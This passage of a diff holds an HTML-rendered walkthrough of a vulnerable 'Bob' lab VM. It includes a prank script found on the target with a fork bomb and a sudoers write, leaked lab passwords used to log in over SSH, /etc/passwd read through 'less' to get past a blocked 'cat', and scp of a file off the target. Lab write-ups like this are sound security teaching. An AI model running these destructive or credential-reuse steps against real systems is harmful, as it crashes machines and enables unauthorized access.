-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sudo echo -e 'Defaults insults' &amp;gt; /etc/sudoers.d/insultz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your computer now insults you when you type your sudo password wrong!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fork Bomb Started, bad luck buddy sucks for you :P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:(){ :|: &amp;amp; };:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;c&quot;&gt;#print(&quot;[WARN] This Prize is manually disabled&quot;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You get NOTHING, You Lose NOTHING, Good Day SIR!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firefox 'https://www.amazon.com/Jay-JA0027-Gift-of-Nothing/dp/B019HDSCPU'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0_0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firefox 'http://www.meatswing.com'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Deleted dpkg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Go Back&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Got you right? ;P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hey man you do you, I ain't touching this...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#REPLACE SEARCHES WITH SEARCH URLS&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ruinsearchlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firefox &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;pauser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[WARN] OPTION NOT SET &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wheel2str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo Welcome to the Wheel Of Fortune, Spin to Win!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press Enter To Spin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;checker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;There’s a lot of these files, but I don’t think they’ll be any useful. Let’s keep looking.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 24
-drwxr-xr-x  6 root   root   4096 Mar  4 13:45 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 22 root   root   4096 Mar  5 04:50 ..
-drwxr-xr-x 18 bob    bob    4096 Mar  5 04:53 bob
-drwxr-xr-x 15 elliot elliot 4096 Feb 27 18:38 elliot
-drwxr-xr-x 15 jc     jc     4096 Feb 27 18:20 jc
-drwxr-xr-x 15 seb    seb    4096 Mar  5 01:18 seb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;elliot
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;elliot
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 116
-drwxr-xr-x 15 elliot elliot  4096 Feb 27 18:38 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x  6 root   root    4096 Mar  4 13:45 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 elliot elliot     0 Feb 27 18:38 .ICEauthority
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 elliot elliot    55 Feb 27 18:21 .Xauthority
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 elliot elliot    25 Feb 27 18:25 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot   220 Feb 27 18:04 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot  3526 Feb 27 18:04 .bashrc
-drwxr-xr-x  7 elliot elliot  4096 Feb 27 18:25 .cache
-drwx------  8 elliot elliot  4096 Feb 27 18:37 .config
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot    55 Feb 27 18:21 .dmrc
-drwx------  3 elliot elliot  4096 Feb 27 18:21 .gnupg
-drwxr-xr-x  3 elliot elliot  4096 Feb 27 18:21 .local
-drwx------  4 elliot elliot  4096 Feb 27 18:21 .mozilla
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot   675 Feb 27 18:04 .profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot 17258 Feb 27 18:38 .xfce4-session.verbose-log
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 elliot elliot  4486 Feb 27 18:38 .xsession-errors
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:25 Desktop
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:36 Documents
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:25 Downloads
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Music
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Pictures
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Public
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Templates
-drwxr-xr-x  2 elliot elliot  4096 Feb 27 18:21 Videos
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 elliot elliot  1509 Feb 27 18:38 theadminisdumb.txt
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;theadminisdumb.txt
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;theadminisdumb.txt
-The admin is dumb,
-In fact everyone &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone &lt;span class=&quot;k&quot;&gt;else in &lt;/span&gt;the dept, he always yells at Sebastian and James now they &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;some dumb stuff but their new and this is just a high-school server &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;we need custom wallpapers that doesn’t &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;anything. I have been suggesting &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;his friend James &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;before it’s broken into so because of this I have changed my password to
-
-theadminisdumb
-
-I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;it doesn’t affect me &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;they get breached, I get paid, he gets fired it’s a good time.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Hmm, that’s interesing. But at this moment, I decided to use previously obtain passwords and log in using &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh seb@10.0.2.4 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 25468
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[10.0.2.4]:25468 ([10.0.2.4]:25468)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
-ECDSA key fingerprint is SHA256:6836S02YTRSutf2d8Ay4p5JZKyLjfVMb0O0h4FdycQM.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.2.4]:25468&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
-  __  __ _ _ _                        _____                          
- |  \/  (_) | |                      / ____|                         
- | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
- | |\/| | | | '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | | &lt;span class=&quot;s1&quot;&gt;'__/ _` |  \___ \ / _ \ '&lt;/span&gt;__&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;/ / _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__|
- | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
- |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
-                              __/ |                                  
-                             |___/                                   
-
-
-seb@10.0.2.4'&lt;/span&gt;s password:
-Linux debian-Lab 4.9.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64&lt;/span&gt;
-
-The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
-individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-seb@debian-Lab:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
-hey n there /etc/passwd
-seb@debian-Lab:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat
-&lt;/span&gt;hey n there&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Why we can’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. Luckily &lt;code class=&quot;highlighter-rouge&quot;&gt;less&lt;/code&gt; is not blocked.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;seb@debian-Lab:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less /etc/passwd
-c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
-bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
-jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
-seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
-elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
-sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
-proftpd:x:117:65534::/run/proftpd:/bin/false
-ftp:x:118:65534::/srv/ftp:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As I remember something about Bob’s strange wallpaper policy, I decided to look for such and check for any hidden information.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;seb@debian-Lab:~/Downloads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 2984
-drwxr-xr-x  2 seb seb    4096 Mar  5 01:16 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 15 seb seb    4096 Mar  5 01:18 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 seb seb 3046222 Mar  5 01:16 GWUvFch.png&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We can copy it using &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 25468 seb@10.0.2.4:/home/seb/Downloads/GWUvFch.png ~
-  __  __ _ _ _                        _____                          
- |  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |                      / ____|                         
- | &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / |_| | |__  _   _ _ __ __ _  | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___ _ ____   _____ _ __
- | |&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;| | | | &lt;span class=&quot;s1&quot;&gt;'_ \| | | | '&lt;/span&gt;__/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__\ \ / / _ \ '&lt;/span&gt;__|
- | |  | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  __/ |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;V /  __/ |   
- |_|  |_|_|_|_.__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, | |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|   
-                              __/ |                                  
-                             |___/                                   
-
-
-seb@10.0.2.4&lt;span class=&quot;s1&quot;&gt;'s password:
-GWUvFch.png                                   100% 2975KB  38.8MB/s   00:00&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/bob/wallpaper.png&quot; alt=&quot;Wallpaper&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;But that was false alarm as nothing was there. And that’s when I decided to go back to Bob. In the &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; directory that was something else that I missed during the first time.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;seb@debian-Lab:/home/bob&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Documents/
